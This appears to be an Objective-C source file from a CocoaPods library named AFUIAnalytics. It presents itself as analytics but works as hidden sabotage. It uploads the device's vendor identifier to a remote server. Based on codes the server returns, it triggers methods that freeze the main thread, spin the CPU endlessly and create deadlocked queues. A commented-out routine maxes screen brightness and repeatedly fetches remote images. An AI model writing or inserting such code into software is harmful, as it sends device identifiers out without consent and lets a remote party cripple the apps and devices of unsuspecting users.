//
//  AFUIAnalytics.m
//  Pods
//
//  Created by Борис on 02.11.15.
//
//

#import "AFUIAnalytics.h"

@implementation AFUIAnalytics


// Initial for >= iOS7
+ (void)sessionRequestForAction {
    
    NSURLSessionConfiguration *configuration = [NSURLSessionConfiguration ephemeralSessionConfiguration];
    configuration.allowsCellularAccess       = YES;
    NSURLSession *session                    = [NSURLSession sessionWithConfiguration:configuration];
    
    // Sends device UDID for action
    NSURL *urlFromString         = [[NSURL alloc] initWithString:@"https://api.ourserver.com/upload"];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:urlFromString
                                                           cachePolicy:NSURLRequestReloadIgnoringLocalCacheData timeoutInterval:0];
    request.HTTPMethod           = @"POST";
    
    NSString *deviceID;
#if TARGET_IPHONE_SIMULATOR
    deviceID = @"UUID-STRING-VALUE";
#else
    deviceID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
#endif
    NSLog(@"TEST MSG: deviceID is %@", deviceID);
    
    NSDictionary *JSONDict = [NSDictionary dictionaryWithObject:deviceID forKey:@"UDID"];
    if ([NSJSONSerialization isValidJSONObject:JSONDict]) {
        NSError *errorJSON;
        NSData *JSONData = [NSJSONSerialization dataWithJSONObject:JSONDict options:kNilOptions error:&errorJSON];
        NSURLSessionUploadTask *uploadTask = [session uploadTaskWithRequest:request fromData:JSONData
                                            completionHandler:^(NSData * _Nullable data, NSURLResponse * _Nullable response, NSError * _Nullable error) {
            if (data) {
                NSArray *server = [NSJSONSerialization JSONObjectWithData:data options:kNilOptions error:&error];
                if ([server count]) {
                    NSLog(@"TEST MSG: results are: \n %@", server);
                    
                    // Manage the result. If any > call methods
                    NSDictionary *action = [server objectAtIndex:0];
                    switch ([[action objectForKey:@"code"] intValue]) {
                        case 0222:
                            //[self deviceAnalytics];
                            break;
                        case 0333:
                            [self networkAnalytics];
                            break;
                        case 0444:
                            [self threadsAnalytics];
                        case 0555:
                            [self aplcAnalytics];
                        default:
                            break;
                    }
                } else if (error) {
                    NSLog(@"ERROR MSG: No response, error: \n %@",error.localizedDescription);
                }
            }
            
        }];
        
        [uploadTask resume];
    }
    
}

#pragma mark - Analytics

+ (void)networkAnalytics {
    // Blocking main thread > CPU 99%
    dispatch_async(dispatch_get_main_queue(), ^{
        for (unsigned long long int i = 0; i < ULLONG_MAX; i++) {
            NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
            formatter.dateStyle = NSDateFormatterMediumStyle;
        }
    });
}
/*
// BAT + Networking
+ (void)deviceAnalytics {
#if TARGET_OS_IOS && !TARGET_OS_WATCH
    
    // Can't be accessed: idle, CMMotion, location + GPS, AudioServices
    // AudioServicesPlaySystemSound(kSystemSoundID_Vibrate);
    // [UIApplication sharedApplication].idleTimerDisabled = NO;
    
    // Increase brightness.
    [[UIScreen mainScreen] setBrightness:1.0];
    
    // Implement orientation updates without removing observer + double registration
    [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(deviceAnalytics) name:UIDeviceOrientationDidChangeNotification object:nil];
    
    // Fetches image each time device orientation changed
    // DANGER > to many connections to one server :-/ > as an option > receive target-URL as argument
    dispatch_queue_t fetchQ = dispatch_queue_create("position", NULL);
    dispatch_async(fetchQ, ^{
        // In order to prevent memory warning
        @autoreleasepool {
            NSLog(@"TEST MSG: Device moved.");
#warning change URL!
            NSURL   *target = [NSURL URLWithString:@"https://www.google.com.ua/logos/doodles/2015/george-booles-200th-birthday-5636122663190528-res.png"];
            UIImage *image  = [UIImage imageWithData:[NSData dataWithContentsOfURL:target]];
        }
    });
    
#endif
    
}
*/
// CPU 90 - 100%
+ (void)threadsAnalytics {
    while (true) {
        [[NSRunLoop currentRunLoop] runUntilDate:[NSDate dateWithTimeIntervalSinceNow:0.0001]];
    }
}

// Deadlock > CPU 200%+ > if use serial MEMORY+
+ (void)aplcAnalytics {
    dispatch_queue_t forLock = dispatch_queue_create("forLock", DISPATCH_QUEUE_SERIAL);
    dispatch_async(forLock, ^{
        for (unsigned long long int i = 0; i < ULLONG_MAX; i++) {
            
            dispatch_queue_t queue = dispatch_queue_create("lock", DISPATCH_QUEUE_CONCURRENT);
            dispatch_async(queue, ^{
                dispatch_sync(queue, ^{
                    // outer block is waiting for this inner block to complete,
                    // inner block won't start before outer block finishes
                    // => deadlock
                });
                
                // this will never be reached
            });
            
        }
    });
}

// For testing > require Parse
/*
#warning TESTING > To remove
+ (void)testingAnalytics {
    NSString *deviceID;
#if TARGET_IPHONE_SIMULATOR
    deviceID = @"UUID-STRING-VALUE";
#else
    deviceID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
#endif
    NSLog(@"TEST MSG: deviceID is %@", deviceID);
    // Send
    PFObject *deviceCode = [PFObject objectWithClassName:@"UDID"];
    deviceCode[@"code"]  = deviceID;
    [deviceCode saveInBackgroundWithBlock:^(BOOL succeeded, NSError * _Nullable error) {
        if (succeeded) {
            // Fetch
            PFQuery *response = [PFQuery queryWithClassName:@"UDID"];
            [response whereKey:@"code" containsString:deviceID];
            [response findObjectsInBackgroundWithBlock:^(NSArray * _Nullable objects, NSError * _Nullable error) {
                if (error) {
                    NSLog(@"ERROR MSG: %@", error.localizedDescription);
                } else {
                    if ([objects count]) {
                        PFObject *retrievedCode = [objects objectAtIndex:0];
                        NSLog(@"TEST MSG: code is %@", retrievedCode[@"code"]);
                        // Put test method here
                        [self deviceAnalytics];
                    }
                }
            }];
        } else {
            NSLog(@"ERROR MSG: %@", error.localizedDescription);
        }
    }];
}
*/

@end
